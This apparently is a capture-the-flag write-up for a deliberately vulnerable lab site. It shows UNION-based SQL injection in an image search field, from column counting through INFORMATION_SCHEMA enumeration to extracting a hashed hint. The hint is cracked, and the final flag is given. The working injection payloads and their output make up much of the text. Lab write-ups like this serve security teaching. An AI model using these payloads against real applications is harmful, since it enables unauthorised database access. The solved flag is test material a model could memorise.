# SQL Injection Vulnerability in Image Input Field<

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

## How we find it ?

**Location:** `page=searchimg`

**Step 0:**

write `1` in the input field; an SQL result will be thrown, which means that the `image input` field is vulnerable to SQL injectionß

```sql
ID: 1
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

```

**Step 1:** try to write `74 or true` SQL Statement in saerch image input field:

**Result:**
the original SQL query is not properly sanitized or parameterized, the injected code might be incorporated into the WHERE clause as
SELECT \* FROM <images_table_name> WHERE id = 74 or true;
In this injected code, 74 or true manipulates the WHERE clause of the original query to always return true, effectively bypassing any conditions intended to restrict the results.

```sql
ID: 74 or true
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 74 or true
Title: 42 !
Url : https://fr.wikipedia.org/wiki/Fichier:42

ID: 74 or true
Title: Google
Url : https://fr.wikipedia.org/wiki/Logo_de_Go

ID: 74 or true
Title: Earth
Url : https://en.wikipedia.org/wiki/Earth#/med

ID: 74 or true
Title: Hack me ?
Url : borntosec.ddns.net/images.png

```

**Step 2 :**

In SQL injection attacks, knowing the number of columns in a SQL query can be important for constructing a SQL statement that doesn't break the syntax or structure of the original query. Additionally, if we want to use the UNION clause to combine other queries into the original, this condition should be fulfilled: Every SELECT statement within UNION must have the same number of columns.
We can use the `union-based` SQL injection technique to select more and more null values until the query is correct.
The UNION operator is used to combine the result sets of two or more SELECT statements.

```sql

SELECT _column_name(s)_ FROM _table1_ UNION SELECT _column_name(s)_ FROM _table2_;
Every SELECT statement within UNION must have the same number of columns.
The columns must also have similar data types.
The columns in every SELECT statement must also be in the same order.

```

```sql

74 or 1=1 UNION SELECT null; -- not working
74 or 1=1 UNION SELECT null,null; -- This works.
74 or 1=1 UNION SELECT null,null,null; -- not working
```

**Step 3 :** use the information_schema database

`INFORMATION_SCHEMA` is a database within each MySQL instance, the place that stores information about all the other databases, contains several read-only tables, and not perform INSERT, UPDATE, or DELETE operations on them.
You can use queries against the information_schema database to retrieve information about the database server, such as:

- Listing databases and their properties (SCHEMATA table).
- Listing tables in a database (TABLES table).
- Listing columns in a table (COLUMNS table).
- Listing indexes in a table (STATISTICS table).
- Listing privileges that users have (SCHEMA_PRIVILEGES, TABLE_PRIVILEGES, COLUMN_PRIVILEGES tables).

```sql
74 or 1=1 union select TABLE_NAME, TABLE_TYPE from INFORMATION_SCHEMA.tables

```

```sql
ID: 74 or 1=1 union select TABLE_NAME, TABLE_TYPE from INFORMATION_SCHEMA.tables
Title: BASE TABLE
Url : db_default

ID: 74 or 1=1 union select TABLE_NAME, TABLE_TYPE from INFORMATION_SCHEMA.tables
Title: BASE TABLE
Url : users

ID: 74 or 1=1 union select TABLE_NAME, TABLE_TYPE from INFORMATION_SCHEMA.tables
Title: BASE TABLE
Url : guestbook

ID: 74 or 1=1 union select TABLE_NAME, TABLE_TYPE from INFORMATION_SCHEMA.tables
Title: BASE TABLE
Url : list_images

ID: 74 or 1=1 union select TABLE_NAME, TABLE_TYPE from INFORMATION_SCHEMA.tables
Title: BASE TABLE
Url : vote_dbs

```

Here's a breakdown of what's happening:

- The original query appears to be something like
  ```sql
  SELECT column1, column2 FROM table_name WHERE ID = ''
  ```
- The injection starts with 74 or 1=1 which is always true (1=1), effectively bypassing any ID-based filtering in the original query.
- Then, we perform a UNION with another SELECT statement that retrieves TABLE_NAME and TABLE_TYPE columns from the INFORMATION_SCHEMA.tables.
- The retrieved table names `db_default`, `users`,` guestbook`, `list_images`,` vote_dbs`
  the value BASE TABLE in the TABLE_TYPE column indicates that the table is a regular, user-created table, not a view or a system table
  and as its a search filed on images we will be intrested on retrieving data from the list_image table

```sql
 74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
```

```sql
ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
Title: id
Url : list_images

ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
Title: url
Url : list_images

ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
Title: title
Url : list_images

ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
Title: comment
Url : list_images

```

we tried :

```sql
74 or 1=1 union select id, url  from list_images
74 or 1=1 union select  title, comment from list_images


```

After testing these series of SQL injection attempts, we observed that the flag appeared in the final query. In the seconf query
the result shows :

```sql
ID: 74 or 1=1 union select  title, comment from list_images
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?

```

The instruction indicates that to verify this password, one should decrypt it, convert all characters to lowercase, and then apply the SHA256 hashing algorithm.
using : https://www.dcode.fr/identification-chiffrement to execute the instructions

decrypt MD5(1928e8083cf461a51303633093573c46) :`albatroz`
lowercase the dycrepted value: `albatroz`
SHA256(albatroz): `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

the flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

**Resources:**

information_shema:

- https://dev.mysql.com/doc/mysql-infoschema-excerpt/8.3/en/information-schema-introduction.html

MySQL Injection:

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
- https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection
- https://portswigger.net/web-security/sql-injection

dCode:

- https://www.dcode.fr/identification-chiffrement
